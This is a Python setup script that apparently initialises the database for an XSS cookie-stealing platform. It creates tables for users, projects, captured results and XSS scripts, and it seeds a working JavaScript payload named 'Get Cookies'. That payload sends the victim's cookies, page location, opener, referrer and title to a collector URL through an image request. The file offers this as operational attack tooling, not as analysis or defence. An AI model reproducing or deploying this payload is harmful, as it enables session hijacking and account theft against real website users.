import sqlite3
from lib.settings import db_path
from lib.utils import now

get_cookie = """
var x=new Image();
try
{
var myopener='';
myopener=window.opener && window.opener.location ? window.opener.location : '';
}
catch(err)
{
}
x.src='{{ now_path }}?id={{ id }}&location='+escape(document.location)+'&toplocation='+escape(top.document.location)+'&cookie='+escape

(document.cookie)+'&opener='+escape(myopener)+'&referrer='+escape(document.referrer)+'&title='+escape(document.title);
"""


db = sqlite3.connect(db_path)

db.execute("""
    create table users (
        id integer not null primary key autoincrement,
        username char(50) not null,
        password char(100) not null,
        token char(50) default null
    )
""")

db.execute("""
    create table projects (
        id integer not null primary key autoincrement,
        name char(50) not null,
        type integer not null,
        type_name char(50) not null,
        owner integer not null,
        created_date char(50) not null
    )
""")


db.execute("""
    create table project_results (
        id integer not null primary key autoincrement,
        project_id integer not null,
        raw_data longtext default null,
        server_data longtext default null,
        got_time char(50) default null
    )
""")


db.execute("""
    create table xss_core (
        id integer not null primary key autoincrement,
        name char(50) not null,
        script longtext default null,
        owner integer not null default 0
    )
""")


db.execute('insert into xss_core(name, script) values (?, ?)', ('Get Cookies', get_cookie))

db.execute('insert into projects(name, type, owner, created_date, type_name) values (?, ?, ?, ?, ?)',
           ('test', 1, 1, now(), 'Get Cookies'))

db.commit()
db.close()
#todo add some data of xss-scripts and test account.
